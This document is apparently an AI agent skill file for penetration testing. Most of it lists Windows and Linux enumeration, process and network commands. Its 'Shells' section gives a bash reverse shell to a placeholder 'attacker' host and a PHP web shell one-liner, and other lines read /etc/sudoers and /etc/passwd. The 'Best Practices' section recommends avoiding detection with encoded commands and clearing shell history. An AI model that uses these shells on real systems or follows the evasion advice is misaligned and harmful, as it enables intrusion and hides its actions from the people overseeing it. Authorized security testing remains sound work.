---
name: command-execution
description: |
  Security-focused command execution techniques for penetration testing.
  Use this skill when executing system commands during authorized security assessments.
  Covers Windows and Linux command execution, common security testing commands,
  and best practices for avoiding detection.
version: "1.0.0"
author: "Secbot Security Team"
tags: ["command", "execution", "terminal", "shell", "pentest"]
triggers: ["execute_command", "run", "shell", "cmd", "bash", "command"]
prerequisites: ["authorized_target"]
---

# Command Execution in Security Testing

## Overview

This skill provides guidance on executing system commands effectively during penetration testing engagements.

## Windows Commands

### Network Discovery
```cmd
# Local IP configuration
ipconfig /all

# Network connections
netstat -ano

# Active connections
netstat -ano | findstr ESTABLISHED

# ARP table
arp -a

# DNS lookup
nslookup target.com
```

### Process Management
```cmd
# List processes
tasklist /v

# Find specific process
tasklist | findstr python

# Kill process
taskkill /F /PID <pid>
```

### File System
```cmd
# List directory
dir /a /s

# Find files
dir /s /b *.exe

# File attributes
attrib
```

### User & Group
```cmd
# User accounts
net user

# Current user
whoami /all

# Local groups
net localgroup

# User info
net user <username>
```

## Linux Commands

### Network Discovery
```bash
# Network interfaces
ip addr show

# Listening ports
netstat -tulpn

# Active connections
ss -tulwn

# ARP table
arp -a

# DNS resolution
dig target.com
```

### Process Management
```bash
# List processes
ps aux

# Find process
ps aux | grep python

# Kill process
kill -9 <pid>

# Process tree
pstree
```

### File System
```bash
# Find executables
find / -perm -4000 2>/dev/null

# Recent files
find / -mtime -1 2>/dev/null

# SUID files
find / -perm -4000 -type f
```

### User & Group
```bash
# Current user
id

# Sudoers
cat /etc/sudoers

# User accounts
cat /etc/passwd

# Groups
cat /etc/group
```

## Security Testing Commands

### Enumeration
```bash
# Service version detection
nmap -sV <target>

# OS detection
nmap -O <target>

# Vulnerability scripts
nmap --script vuln <target>
```

### Web Testing
```bash
# curl basic
curl -v http://target

# POST request
curl -X POST -d "param=value" http://target

# SSL testing
curl -k https://target
```

### Shells
```bash
# Reverse shell
bash -i >& /dev/tcp/attacker/port 0>&1

# Web shell upload test
echo "<?php system(\$_GET['cmd']); ?>" > shell.php
```

## Best Practices

1. **Avoid Detection**
   - Use encoded commands when possible
   - Limit command output visibility
   - Clear history after commands: `history -c`

2. **Error Handling**
   - Always check return codes
   - Redirect stderr: `2>&1`
   - Use timeout for long-running commands

3. **Cross-Platform**
   - Use portable commands when possible
   - Test commands in isolated environment first
   - Consider WSL for Linux tools on Windows

## Timeout Recommendations

| Command Type | Recommended Timeout |
|--------------|---------------------|
| Quick check (ping, whoami) | 10s |
| Network scan | 60s |
| File search | 120s |
| Large transfer | 300s |

## Output Parsing

Extract specific information from command output:
```bash
# Get IP only
ipconfig | findstr "IPv4"

# Get specific field
netstat -ano | findstr :80

# Count results
netstat -ano | findstr ESTABLISHED | find /c /v ""
```
